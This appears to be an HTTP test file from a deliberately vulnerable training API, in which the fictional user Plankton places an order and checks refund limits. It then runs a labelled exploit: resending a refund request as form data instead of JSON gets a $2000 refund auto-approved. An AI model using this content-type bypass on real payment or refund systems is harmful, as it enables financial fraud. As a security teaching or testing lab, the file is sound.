# @import ../common/setup.http
@base = {{base_host}}/v105

### Plankton places a $25 order
# @name cart
POST {{base}}/cart
Authorization: {{plankton_auth}}

POST {{base}}/cart/{{cart.cart_id}}/items
Authorization: {{plankton_auth}}
Content-Type: application/json

{ "item_id": "6" }

###
# @name order
POST {{base}}/cart/{{cart.cart_id}}/checkout
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

tip=0&delivery_address=Chum Bucket

# --- Legitimate Usage: Plankton can request a small refund ---

### Plankton requests a $1 refund for his order
# It is automatically approved because it is less than 20% of the order total
POST {{base}}/orders/{{order.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "amount": "1"
}

?? status == 200

### If Plankton tries to request a refund more expensive than his order, it will be rejected
POST {{base}}/orders/{{order.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/json

{
  "amount": "50"
}

?? status == 400

# --- Exploit: Plankton can request a unlimited refund ---

### Plankton requests a $2000 refund using form data instead of JSON
# @name exploit
POST {{base}}/orders/{{order.order_id}}/refund
Authorization: {{plankton_auth}}
Content-Type: application/x-www-form-urlencoded

amount=2000

?? status == 200
?? js response.parsedBody.status == auto_approved
?? js response.parsedBody.amount == 2000

### Check Planktons' balance
# He is super rich now ðŸ˜³
GET {{base}}/account/credits
Authorization: {{plankton_auth}}
